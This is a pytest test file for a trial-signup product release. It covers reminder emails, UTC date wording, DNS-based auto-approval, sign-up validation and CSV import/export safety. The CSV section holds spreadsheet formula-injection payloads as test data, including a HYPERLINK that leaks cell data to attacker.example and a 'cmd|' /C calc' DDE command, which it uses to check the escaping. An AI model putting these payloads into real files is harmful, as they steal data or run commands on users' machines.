"""Release 0.10.36: the P2 and P3 findings of the pre-launch review taken on the trial maintenance line.

- FUN-04: an extended trial gets its 7-day, 1-day and ended reminders again for the new end date, once each.
- FUN-15: trial emails and the trial-ended page give the end and the deletion with the time and "UTC".
- SEC-07: automatic approval needs the email's domain to exist in DNS, and its daily cap counts requests.
- SEC-06: the inspection pack's CSV files are formula-safe, and the import refuses what csv_safe would escape.
- FUN-12: sign-up refuses "x@localhost", "x@@...", and a name or organization that is only spaces.
- FUN-10: the trial's six import templates load in the order they are offered.
"""

import socket
import time
import uuid
from datetime import datetime, timedelta, timezone

import pytest
from fastapi.testclient import TestClient

from auth import emailer
from backend.app import notifications
from backend.app.db.models.foundation import Capa, Investigation, InvestigationComplaint, PlanDefinition, Tenant
from backend.app.db.models.stage2 import OnboardingRequest, OutboxEvent, SubscriptionLifecycle
from backend.app.db.session import SessionLocal
from backend.app.db.tenant_scope import bind_system, bind_tenant
from backend.app.main import app
from backend.app.readiness_home import pack
from backend.app.trial import auto_approval, imports
from backend.app.trial.service import long_moment
from tests.signup_profile import PROFILE
from tests.test_free_trial import _approved_trial_client, _clean_trial_workspaces  # noqa: F401 (module fixture)


# ------------------------------------------------------------------- FUN-04: an extension re-arms the reminders


def _trial_subscription(db, expires_at: datetime) -> SubscriptionLifecycle:
    plan = db.query(PlanDefinition).filter(PlanDefinition.code == "FREE_TRIAL").first()
    if plan is None:
        pytest.skip("no Free Trial plan in this database")
    tenant = db.query(Tenant).filter(Tenant.tenant_key == "ACME_CARE_SYNTHETIC").first() or db.query(Tenant).first()
    subscription = SubscriptionLifecycle(
        id=uuid.uuid4(),
        tenant_id=tenant.id,
        plan_id=plan.id,
        plan_version="1",
        starts_at=expires_at - timedelta(days=30),
        expires_at=expires_at,
        created_at=expires_at - timedelta(days=30),
        updated_at=expires_at - timedelta(days=30),
    )
    db.add(subscription)
    db.flush()
    return subscription


def _queued(db, subscription) -> list[tuple[str, str | None]]:
    rows = db.query(OutboxEvent).filter(
        OutboxEvent.event_name == "TRIAL_REMINDER",
        OutboxEvent.payload["subscription_id"].as_string() == str(subscription.id),
    )
    return sorted(
        ((row.payload["stage"], row.payload.get("expires_at")) for row in rows),
        key=lambda item: (item[0], item[1] or ""),
    )


def test_an_extended_trial_gets_its_reminders_again_for_the_new_end_date_and_never_twice_for_one_date():
    db = SessionLocal()
    try:
        bind_system(db, "test")
        now = datetime.now(timezone.utc)
        subscription = _trial_subscription(db, now + timedelta(days=5))
        first_end = notifications.trial_reminder_end(subscription.expires_at)
        notifications.queue_trial_reminders(db, now)
        notifications.queue_trial_reminders(db, now + timedelta(days=4, hours=12))
        db.flush()
        assert _queued(db, subscription) == [("1_DAY", first_end), ("7_DAY", first_end)]

        # Extended by 14 days after both reminders went out: the new end date gets its own reminders.
        subscription.expires_at += timedelta(days=14)
        subscription.expiry_version += 1
        db.flush()
        new_end = notifications.trial_reminder_end(subscription.expires_at)
        seven_days_before = subscription.expires_at - timedelta(days=6, hours=20)
        for _ in range(3):
            notifications.queue_trial_reminders(db, seven_days_before)
            db.flush()
        assert _queued(db, subscription) == [("1_DAY", first_end), ("7_DAY", first_end), ("7_DAY", new_end)]
        # Each scheduler run commits; the session does not flush by itself.
        for hours in (-20, 1, 2):
            notifications.queue_trial_reminders(db, subscription.expires_at + timedelta(hours=hours))
            db.flush()
        stages_for_new_end = sorted(stage for stage, end in _queued(db, subscription) if end == new_end)
        assert stages_for_new_end == ["1_DAY", "7_DAY", "ENDED"]
    finally:
        db.rollback()
        db.close()


def test_a_reminder_queued_before_the_release_still_counts_for_the_unchanged_end_date():
    """Reminders queued by 0.10.35 have no end date in their payload: the trial that got its 7-day email yesterday
    does not get it again after the upgrade, but would after an extension."""
    db = SessionLocal()
    try:
        bind_system(db, "test")
        now = datetime.now(timezone.utc)
        subscription = _trial_subscription(db, now + timedelta(days=6))
        db.add(
            OutboxEvent(
                tenant_id=subscription.tenant_id,
                event_name="TRIAL_REMINDER",
                aggregate_type="SubscriptionLifecycle",
                aggregate_id=subscription.id,
                payload={"subscription_id": str(subscription.id), "stage": "7_DAY"},
                occurred_at=now - timedelta(days=1),
            )
        )
        db.flush()
        notifications.queue_trial_reminders(db, now)
        db.flush()
        assert _queued(db, subscription) == [("7_DAY", None)]
        subscription.expires_at += timedelta(days=10)
        db.flush()
        notifications.queue_trial_reminders(db, subscription.expires_at - timedelta(days=6))
        db.flush()
        assert _queued(db, subscription) == [
            ("7_DAY", None),
            ("7_DAY", notifications.trial_reminder_end(subscription.expires_at)),
        ]
    finally:
        db.rollback()
        db.close()


# ------------------------------------------------------------------ FUN-15: the end with its time and time zone


def test_trial_end_and_deletion_dates_name_the_time_and_utc():
    # 18 November 2026, 21:51 UTC is 19 November in India and 18 November in the Americas: the time says which.
    assert long_moment(datetime(2026, 11, 18, 21, 51, 30, tzinfo=timezone.utc)) == "18 November 2026, 21:51 UTC"
    ist = timezone(timedelta(hours=5, minutes=30))
    assert long_moment(datetime(2026, 11, 19, 3, 21, tzinfo=ist)) == "18 November 2026, 21:51 UTC"


def test_the_reminder_and_ended_emails_carry_the_unambiguous_end_and_deletion(monkeypatch):
    sent = []
    monkeypatch.setattr(
        emailer, "_send_email", lambda to, subject, text, html=None, reply_to=None: sent.append((text, html)) or "SENT"
    )
    emailer.send_trial_reminder(
        "owner@orbit.example",
        "Orbit Medical Devices",
        days_left=7,
        ends_on="18 November 2026, 21:51 UTC",
        delete_on="18 December 2026, 21:51 UTC",
    )
    emailer.send_trial_ended("owner@orbit.example", "Orbit Medical Devices", delete_on="18 December 2026, 21:51 UTC")
    for text, html in sent:
        assert "18 December 2026, 21:51 UTC" in text and "18 December 2026, 21:51 UTC" in html
        assert "at the earliest" in text
    assert "18 November 2026, 21:51 UTC" in sent[0][0]


def test_the_trial_reminder_delivery_formats_both_dates_with_time_and_zone():
    captured = {}

    class Fake:
        EmailDeliveryError = RuntimeError

        @staticmethod
        def send_trial_reminder(recipient, **details):
            captured.update(details)
            return "SENT"

    user, approval, _email = _approved_trial_client()
    with SessionLocal() as db:
        bind_system(db, "test")
        subscription = (
            db.query(SubscriptionLifecycle)
            .filter(SubscriptionLifecycle.tenant_id == uuid.UUID(approval["tenant_id"]))
            .one()
        )
        notifications._trial_reminder(db, {"subscription_id": str(subscription.id), "stage": "7_DAY"}, Fake)
        assert captured["ends_on"] == long_moment(subscription.expires_at)
    assert captured["ends_on"].endswith(" UTC") and captured["delete_on"].endswith(" UTC")


# --------------------------------------------------------------- SEC-07: the domain must exist; the cap counts tries


def test_the_dns_check_can_be_skipped_only_on_a_development_or_test_machine(monkeypatch):
    monkeypatch.setenv("MDARIX_TRIAL_DOMAIN_CHECK", "off")
    for environment in ("development", "test"):
        monkeypatch.setenv("MDARIX_ENV", environment)
        assert auto_approval.domain_check() == "off"
    for environment in ("staging", "production", ""):
        monkeypatch.setenv("MDARIX_ENV", environment)
        assert auto_approval.domain_check() == "dns"
    monkeypatch.setenv("MDARIX_ENV", "development")
    monkeypatch.delenv("MDARIX_TRIAL_DOMAIN_CHECK")
    assert auto_approval.domain_check() == "dns"


def test_a_domain_resolves_only_when_dns_answers_in_time(monkeypatch):
    def answer(domain, _port):
        if domain.startswith("slow-"):
            time.sleep(1)
            return [("found",)]
        if domain.startswith("real-"):
            return [("found",)]
        raise socket.gaierror(socket.EAI_NONAME, "Name or service not known")

    monkeypatch.setattr(socket, "getaddrinfo", answer)
    monkeypatch.setattr(auto_approval, "DNS_TIMEOUT_SECONDS", 0.1)
    tag = uuid.uuid4().hex[:8]
    assert auto_approval.domain_resolves(f"real-{tag}.com")
    assert not auto_approval.domain_resolves(f"made-up-{tag}.com")
    assert not auto_approval.domain_resolves(f"slow-{tag}.com")  # DNS that does not answer: a person reviews it

    # A domain found is not looked up again for a while (sign-up and the approval after it ask the same question).
    monkeypatch.setattr(socket, "getaddrinfo", lambda *_args: pytest.fail("looked up again"))
    assert auto_approval.domain_resolves(f"real-{tag}.com")


def test_a_company_email_whose_domain_does_not_exist_waits_for_review(monkeypatch):
    monkeypatch.setenv("MDARIX_TRIAL_AUTO_APPROVE", "company-domains")
    monkeypatch.setenv("MDARIX_TRIAL_AUTO_APPROVE_DAILY_MAX", "100000")
    monkeypatch.setenv("MDARIX_TRIAL_DOMAIN_CHECK", "dns")
    looked_up = []

    def no_such_domain(domain, _port):
        looked_up.append(domain)
        raise socket.gaierror(socket.EAI_NONAME, "Name or service not known")

    monkeypatch.setattr(socket, "getaddrinfo", no_such_domain)
    domain = f"made-up-{uuid.uuid4().hex[:8]}.com"
    response = TestClient(app).post(
        "/api/v1/auth/signup",
        json={"email": f"lead@{domain}", "display_name": "Taylor Quality", "organization": "Nowhere Ltd", **PROFILE},
    )
    assert response.status_code == 200 and response.json()["status"] == "ONBOARDING_REQUEST_ACCEPTED"
    assert looked_up == [domain]
    with SessionLocal() as db:
        bind_system(db, "test")
        row = db.query(OnboardingRequest).filter(OnboardingRequest.email == f"lead@{domain}").one()
        assert row.status == "PENDING_REVIEW" and row.tenant_id is None
        assert auto_approval.eligible(db, row.id) == (False, "DOMAIN_NOT_FOUND")


def test_the_daily_cap_counts_the_days_company_requests_not_only_the_approvals(monkeypatch):
    monkeypatch.setenv("MDARIX_TRIAL_AUTO_APPROVE", "company-domains")
    # A day of its own, far ahead, so the test database's other requests do not count.
    day = datetime(2099, 1, 1, tzinfo=timezone.utc) + timedelta(days=uuid.uuid4().int % 3000)
    tag = uuid.uuid4().hex[:8]

    def request(email: str, hour: int, status: str = "PENDING_REVIEW") -> OnboardingRequest:
        at = day + timedelta(hours=hour)
        return OnboardingRequest(
            id=uuid.uuid4(),
            email=email,
            display_name="Taylor Quality",
            organization="Cap Test",
            status=status,
            profile={},
            created_at=at,
            updated_at=at,
        )

    earlier = [
        request(f"a@first-{tag}.com", 1, "DECLINED"),  # never approved, still an attempt
        request(f"b@second-{tag}.com", 2),
        request(f"c-{tag}@gmail.com", 3),  # a personal address counts towards its own cap, not the company one
    ]
    this = request(f"d@third-{tag}.com", 4)
    later = request(f"e@fourth-{tag}.com", 5)  # after this one: not counted
    with SessionLocal() as db:
        bind_system(db, "test")
        db.add_all([*earlier, this, later])
        db.commit()
        try:
            monkeypatch.setenv("MDARIX_TRIAL_AUTO_APPROVE_DAILY_MAX", "2")
            assert auto_approval.eligible(db, this.id) == (False, "DAILY_CAP")
            monkeypatch.setenv("MDARIX_TRIAL_AUTO_APPROVE_DAILY_MAX", "3")
            assert auto_approval.eligible(db, this.id) == (True, "COMPANY_DOMAIN")
        finally:
            for row in (*earlier, this, later):
                db.delete(row)
            db.commit()


# ------------------------------------------------------------------- SEC-06: formulas in CSV files, both ways


def test_the_inspection_pack_csv_never_holds_a_formula():
    body = pack._csv(
        ["Signal", "Title", "Days"],
        [
            ["SIG-1", '=HYPERLINK("https://attacker.example/?d="&B3,"Open signal")', -3],
            ["SIG-2", "-2+3+cmd|' /C calc'!A0", 4],
            ["SIG-3", "@SUM(A1:A2)", 0],
            ["SIG-4", "+cmd", None],
            ["SIG-5", "Ordinary title", 2.5],
        ],
    ).decode("utf-8-sig")
    lines = body.splitlines()
    assert lines[1].startswith("SIG-1,\"'=HYPERLINK(") and lines[1].endswith(",-3")
    assert lines[2] == "SIG-2,'-2+3+cmd|' /C calc'!A0,4"
    assert lines[3] == "SIG-3,'@SUM(A1:A2),0" and lines[4] == "SIG-4,'+cmd,"
    assert lines[5] == "SIG-5,Ordinary title,2.5"


@pytest.mark.parametrize(
    "value",
    ["=1+1", "+cmd|' /C calc'!A0", "-2+3+cmd|' /C calc'!A0", '-0+0+HYPERLINK("https://x.example")', "@SUM(A1)"],
)
def test_the_import_refuses_every_cell_csv_safe_would_escape(value):
    assert imports._spreadsheet_formula(value)


@pytest.mark.parametrize("value", ["-5", "+0.25", "12", "Alarm - no occlusion", "PUMP-200"])
def test_the_import_still_takes_plain_numbers_and_ordinary_text(value):
    assert not imports._spreadsheet_formula(value)


# --------------------------------------------------------- FUN-12: sign-up refuses what cannot be a real request


@pytest.mark.parametrize(
    ("overrides", "code"),
    [
        ({"email": "taylor@localhost"}, "VALID_EMAIL_REQUIRED"),
        ({"email": "taylor@@orbit.example"}, "VALID_EMAIL_REQUIRED"),
        ({"email": "taylor@orbit"}, "VALID_EMAIL_REQUIRED"),
        ({"display_name": "   "}, "NAME_REQUIRED"),
        ({"organization": " \t "}, "ORGANIZATION_REQUIRED"),
    ],
)
def test_sign_up_refuses_a_malformed_email_and_a_blank_name_or_organization(overrides, code):
    email = f"taylor-{uuid.uuid4().hex[:8]}@orbit.example"
    body = {"email": email, "display_name": "Taylor Quality", "organization": "Orbit Medical", **PROFILE, **overrides}
    response = TestClient(app).post("/api/v1/auth/signup", json=body)
    assert response.status_code == 422 and response.json()["detail"]["code"] == code, response.text
    with SessionLocal() as db:
        bind_system(db, "test")
        assert db.query(OnboardingRequest).filter(OnboardingRequest.email == body["email"].lower()).first() is None


# ---------------------------------------------------------------- FUN-10: the templates load in the offered order


def test_the_six_trial_templates_load_in_the_order_they_are_offered():
    # frontend/src/app/featureSet.ts MVP_IMPORT_ENTITIES: what a trial offers, in this order.
    offered = ["products", "lots", "complaints", "investigations", "capas", "risks"]
    user, approval, _email = _approved_trial_client()
    for entity in offered:
        template = user.get(f"/api/v1/trial/templates/{entity}.csv")
        assert template.status_code == 200, entity
        loaded = user.post(f"/api/v1/trial/imports/{entity}", content=template.content)
        assert loaded.status_code == 200, (entity, loaded.text)
    # The investigation links both example complaints, and the CAPA its investigation.
    tenant_id = uuid.UUID(approval["tenant_id"])
    with SessionLocal() as db:
        bind_tenant(db, tenant_id)
        case = (
            db.query(Investigation)
            .filter(Investigation.tenant_id == tenant_id, Investigation.investigation_identifier == "INV-3001")
            .one()
        )
        links = db.query(InvestigationComplaint).filter(InvestigationComplaint.investigation_id == case.id).count()
        capa = db.query(Capa).filter(Capa.tenant_id == tenant_id, Capa.capa_identifier == "CAPA-0450").one()
    assert links == 2 and capa.investigation_id == case.id
